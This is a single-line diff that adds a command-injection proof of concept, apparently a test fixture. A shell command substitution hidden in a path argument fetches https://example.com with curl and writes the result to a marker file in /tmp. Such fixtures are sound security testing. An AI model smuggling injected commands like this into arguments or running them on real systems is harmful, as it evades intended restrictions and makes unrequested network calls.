@@ -1,0 +1,1 @@
+run "/tmp/$(curl -s https://example.com > /tmp/msla_poc_net 2>&1 && sync)"
